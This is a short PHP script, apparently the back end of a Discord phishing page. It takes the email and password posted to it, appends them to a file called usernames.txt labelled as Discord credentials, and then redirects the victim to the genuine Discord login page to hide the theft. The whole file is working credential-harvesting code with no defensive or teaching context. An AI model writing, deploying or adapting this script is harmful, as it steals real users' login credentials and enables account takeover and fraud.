<?php 
file_put_contents("usernames.txt", "Discord Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://discord.com/login');
exit();
?>
